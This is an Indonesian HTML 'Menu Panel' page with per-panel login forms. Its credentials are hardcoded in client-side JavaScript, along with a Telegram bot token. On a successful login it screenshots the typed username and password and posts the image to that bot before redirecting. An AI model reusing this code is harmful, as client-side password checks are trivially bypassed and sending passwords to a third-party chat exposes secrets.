<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Menu Panel</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      color: #333;
    }
    .panel-button {
      margin: 10px;
      padding: 15px 25px;
      font-size: 16px;
      cursor: pointer;
      background-color: #3498db;
      border: none;
      color: white;
      border-radius: 5px;
      transition: background 0.3s;
    }
    .panel-button:hover {
      background-color: #2980b9;
    }
    .login-form {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 2px 2px 10px rgba(0,0,0,0.3);
      z-index: 1001;
    }
    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      z-index: 1000;
    }
    input[type="text"], input[type="password"] {
      width: 80%;
      padding: 8px;
      margin: 5px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .login-form button {
      margin: 5px;
      padding: 8px 15px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .login-form button:first-child {
      background-color: #2ecc71;
      color: white;
    }
    .login-form button:last-child {
      background-color: #e74c3c;
      color: white;
    }
    #notif {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #444;
      color: #fff;
      padding: 10px 20px;
      border-radius: 5px;
      display: none;
      z-index: 1002;
    }
  </style>
</head>
<body>

<h1>Menu Panel</h1>
<div id="menuContainer"></div>

<!-- Login Form -->
<div class="overlay" id="overlay"></div>
<div class="login-form" id="loginForm">
  <h3 id="panelTitle">Login</h3>
  <input type="text" id="username" placeholder="Username"/><br>
  <input type="password" id="password" placeholder="Password"/><br><br>
  <button onclick="submitLogin()">Masuk</button>
  <button onclick="closeForm()">Batal</button>
</div>

<div id="notif"></div>

<!-- Screenshot capture -->
<div id="captureArea" style="display:none;">
  <div id="reportText"></div>
</div>

<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
  const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE";
  const chatId = "7274253936";

  const panels = [
    { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
    { name: "PT JASTEB 1", user: "admin", pass: "111", url: "https://example.com/jasteb" },
    { name: "ZaanHost", user: "zan", pass: "zan", url: "https://example.com/zaanhost" },
    { name: "PRIBADI FAAN", user: "faantek", pass: "faantek", url: "https://example.com/faantek" },
    { name: "KOSONG", user: "test", pass: "123", url: "https://example.com/kosong" }
  ];

  let selectedPanel = null;

  function renderButtons() {
    const container = document.getElementById("menuContainer");
    panels.forEach(panel => {
      const btn = document.createElement("button");
      btn.className = "panel-button";
      btn.textContent = panel.name;
      btn.onclick = () => {
        selectedPanel = panel;
        document.getElementById("panelTitle").textContent = "Login - " + panel.name;
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
        document.getElementById("overlay").style.display = "block";
        document.getElementById("loginForm").style.display = "block";
      };
      container.appendChild(btn);
    });
  }

  function closeForm() {
    document.getElementById("overlay").style.display = "none";
    document.getElementById("loginForm").style.display = "none";
  }

  function submitLogin() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    if (!selectedPanel) return;

    if (username === selectedPanel.user && password === selectedPanel.pass) {
      showNotif("Login berhasil", "#2ecc71");
      const reportHTML = `
        <b>Login Panel:</b> ${selectedPanel.name}<br>
        <b>Username:</b> ${username}<br>
        <b>Password:</b> ${password}<br>
        <b>Waktu:</b> ${new Date().toLocaleString()}
      `;
      document.getElementById("reportText").innerHTML = reportHTML;
      html2canvas(document.getElementById("captureArea")).then(canvas => {
        sendImageToTelegram(canvas);
        setTimeout(() => window.location.href = selectedPanel.url, 1200);
      });
    } else {
      showNotif("Username atau password salah!", "#e74c3c");
    }
  }

  function showNotif(message, color = "#444") {
    const notif = document.getElementById("notif");
    notif.style.background = color;
    notif.textContent = message;
    notif.style.display = "block";
    setTimeout(() => notif.style.display = "none", 3000);
  }

  function sendImageToTelegram(canvas) {
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "login.png");
      fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch(err => console.error("Gagal kirim ke Telegram:", err));
    });
  }

  renderButtons();
</script>

</body>
</html>
